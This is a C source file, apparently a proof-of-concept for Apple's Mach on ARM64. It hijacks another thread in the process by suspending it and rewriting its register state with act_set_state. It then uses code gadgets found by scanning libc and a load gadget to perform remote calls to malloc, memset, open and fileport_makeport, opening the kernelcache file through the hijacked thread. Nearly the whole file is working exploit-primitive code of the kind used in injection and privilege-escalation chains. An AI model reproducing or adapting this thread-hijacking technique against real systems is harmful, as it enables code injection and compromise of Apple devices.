#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>

#define LOG(str, args...) do { fprintf(stderr, str "\n", ##args); } while(0)

extern mach_port_t mach_reply_port(void);
extern int fileport_makeport(int fd, void *portnamep);
extern uint32_t tre_stack_num_objects(uint32_t*);

typedef struct
{
    mach_msg_header_t hdr;
    uint32_t buf[0x10];
} msg_t;

static void* worker(void *arg)
{
    mach_port_t port = *(mach_port_t*)arg;
    struct
    {
        msg_t msg;
        mach_msg_max_trailer_t trailer;
    } msg;
    kern_return_t ret = mach_msg(&msg.msg.hdr, MACH_RCV_MSG, 0, (mach_msg_size_t)sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    LOG("mach_msg_receive: %s", mach_error_string(ret));
    for(size_t i = 0; i < 0x10; ++i)
    {
        LOG("%08x", msg.msg.buf[i]);
    }
    return NULL;
}

int main(void)
{
    int r = 0;
    kern_return_t ret = 0;
    task_t self = mach_task_self();
    thread_t selfth = mach_thread_self();
    mach_port_t port = MACH_PORT_NULL;

    // Setup phase just for demo
    port = mach_reply_port();
    LOG("port: %x", port);

    pthread_t th;
    r = pthread_create(&th, NULL, &worker, &port);
    LOG("pthread_create: %i", r);

    thread_act_array_t threads = NULL;
    mach_msg_type_number_t numth = 0;
    ret = task_threads(self, &threads, &numth);
    LOG("threads: %u, %s", numth, mach_error_string(ret));

    // dirty AF, give the other thread time to block on mach_msg
    usleep(50000);;

    thread_t victim = MACH_PORT_NULL;
    for(size_t i = 0; i < numth; ++i)
    {
        if(threads[i] != selfth)
        {
            victim = threads[i];
            break;
        }
    }

    // Prepare msg
    msg_t msg;
    msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.hdr.msgh_size = sizeof(msg);
    msg.hdr.msgh_remote_port = port;
    msg.hdr.msgh_local_port = MACH_PORT_NULL;
    msg.hdr.msgh_voucher_port = MACH_PORT_NULL;
    msg.hdr.msgh_id = 0x1469;
    msg.buf[0x0] = 0x40404040;
    msg.buf[0x1] = 0x41414141;
    msg.buf[0x2] = 0x42424242;
    msg.buf[0x3] = 0x43434343;
    msg.buf[0x4] = 0x44444444;
    msg.buf[0x5] = 0x45454545;
    msg.buf[0x6] = 0x46464646;
    msg.buf[0x7] = 0x47474747;
    msg.buf[0x8] = 0x48484848;
    msg.buf[0x9] = 0x49494949;
    msg.buf[0xa] = 0x4a4a4a4a;
    msg.buf[0xb] = 0x4b4b4b4b;
    msg.buf[0xc] = 0x4c4c4c4c;
    msg.buf[0xd] = 0x4d4d4d4d;
    msg.buf[0xe] = 0x4e4e4e4e;
    msg.buf[0xf] = 0x4f4f4f4f;

    // XXX XXX XXX REAL CODE FROM HERE XXX XXX XXX

    LOG("victim: %x", victim);
    ret = thread_suspend(victim);
    LOG("thread_suspend: %s", mach_error_string(ret));

    // XXX: this block is NOT part of the real code
    // XXX: just here to demo the worst possible time for a msg to arrive
    {
        ret = mach_msg(&msg.hdr, MACH_SEND_MSG, (mach_msg_size_t)sizeof(msg), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        LOG("mach_msg_send: %s", mach_error_string(ret));
    }

    ret = thread_abort_safely(victim);
    LOG("thread_abort_safely: %s", mach_error_string(ret));

    arm_thread_state64_t saved_state;
    do
    {
        mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
        ret = act_get_state(victim, ARM_THREAD_STATE64, (thread_state_t)&saved_state, &cnt);
        LOG("act_get_state: %s", mach_error_string(ret));
        if(saved_state.__x[0] == KERN_SUCCESS || saved_state.__x[0] == MACH_RCV_INTERRUPTED) break;
        usleep(50000);
    } while(1);

    LOG("saved state:");
    LOG(" x0: 0x%016llx  x1: 0x%016llx  x2: 0x%016llx  x3: 0x%016llx", saved_state.__x[ 0], saved_state.__x[ 1], saved_state.__x[ 2], saved_state.__x[ 3]);
    LOG(" x4: 0x%016llx  x5: 0x%016llx  x6: 0x%016llx  x7: 0x%016llx", saved_state.__x[ 4], saved_state.__x[ 5], saved_state.__x[ 6], saved_state.__x[ 7]);
    LOG(" x8: 0x%016llx  x9: 0x%016llx x10: 0x%016llx x11: 0x%016llx", saved_state.__x[ 8], saved_state.__x[ 9], saved_state.__x[10], saved_state.__x[11]);
    LOG("x12: 0x%016llx x13: 0x%016llx x14: 0x%016llx x15: 0x%016llx", saved_state.__x[12], saved_state.__x[13], saved_state.__x[14], saved_state.__x[15]);
    LOG("x16: 0x%016llx x17: 0x%016llx x18: 0x%016llx x19: 0x%016llx", saved_state.__x[16], saved_state.__x[17], saved_state.__x[18], saved_state.__x[19]);
    LOG("x20: 0x%016llx x21: 0x%016llx x22: 0x%016llx x23: 0x%016llx", saved_state.__x[20], saved_state.__x[21], saved_state.__x[22], saved_state.__x[23]);
    LOG("x24: 0x%016llx x25: 0x%016llx x26: 0x%016llx x27: 0x%016llx", saved_state.__x[24], saved_state.__x[25], saved_state.__x[26], saved_state.__x[27]);
    LOG("x28: 0x%016llx x29: 0x%016llx x30: 0x%016llx  sp: 0x%016llx", saved_state.__x[28], saved_state.__fp   , saved_state.__lr   , saved_state.__sp);
    LOG(" pc: 0x%016llx cpsr: 0x%x", saved_state.__pc, saved_state.__cpsr);

    const char path[] = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
    uint32_t *ret_gadget = (uint32_t*)&sched_yield;
    while(*ret_gadget != 0xd65f03c0) ++ret_gadget;
    // ;-- _tre_stack_num_objects:
    // 0x1808998e8      000c40b9       ldr w0, [x0, 0xc]
    // 0x1808998ec      c0035fd6       ret
#define LOAD_GADGET tre_stack_num_objects
    uint64_t load_off = 0xc;
    LOG("ret_gadget: %p", ret_gadget);
    LOG("load_gadget: %p", &LOAD_GADGET);

    arm_thread_state64_t state = saved_state;
    state.__lr = (uint64_t)ret_gadget;

#define REMOTE_CALL(fn, x0, x1, x2) \
do \
{ \
    state.__pc = (uint64_t)&(fn); \
    state.__x[0] = (uint64_t)(x0); \
    state.__x[1] = (uint64_t)(x1); \
    state.__x[2] = (uint64_t)(x2); \
    ret = act_set_state(victim, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT); \
    LOG("act_set_state: %s", mach_error_string(ret)); \
    ret = thread_resume(victim); \
    LOG("thread_resume: %s", mach_error_string(ret)); \
    while(1) \
    { \
        mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT; \
        ret = act_get_state(victim, ARM_THREAD_STATE64, (thread_state_t)&state, &cnt); \
        LOG("act_get_state: %s", mach_error_string(ret)); \
        if(state.__pc == state.__lr) break; \
        sched_yield(); \
    } \
    ret = thread_suspend(victim); \
    LOG("thread_suspend: %s", mach_error_string(ret)); \
} while(0)

    REMOTE_CALL(malloc, sizeof(path) + 4, 0, 0);
    uint64_t mem = state.__x[0];
    LOG("mem: %llx", mem);
    for(size_t i = 0; i < sizeof(path); ++i)
    {
        REMOTE_CALL(memset, mem + 4 + i, path[i], 1);
    }
    REMOTE_CALL(open, mem + 4, O_RDONLY, 0);
    uint64_t fd = state.__x[0];
    LOG("fd: %llx", fd);
    REMOTE_CALL(fileport_makeport, fd, mem, 0);
    LOG("xxx");
    REMOTE_CALL(LOAD_GADGET, mem - load_off, 0, 0);
    LOG("fileport: %llx", state.__x[0]);

    ret = act_set_state(victim, ARM_THREAD_STATE64, (thread_state_t)&saved_state, ARM_THREAD_STATE64_COUNT);
    LOG("act_set_state: %s", mach_error_string(ret));

    ret = thread_resume(victim);
    LOG("thread_resume: %s", mach_error_string(ret));

    pthread_join(th, NULL);

    return 0;
}
